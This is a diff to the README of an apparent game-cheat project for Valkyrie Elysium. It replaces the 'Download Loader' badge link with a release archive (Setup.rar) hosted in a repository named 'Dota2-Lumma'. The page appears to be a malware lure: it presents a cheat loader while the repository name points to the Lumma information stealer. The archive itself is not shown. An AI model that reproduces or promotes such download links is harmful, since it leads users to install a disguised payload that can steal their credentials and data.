@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Valkyrie Elysium Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Valkyrie-Elysium-Cheats` · Updated: 2026-11-07
 
 **Tags:** `valkyrie-elysium`
+
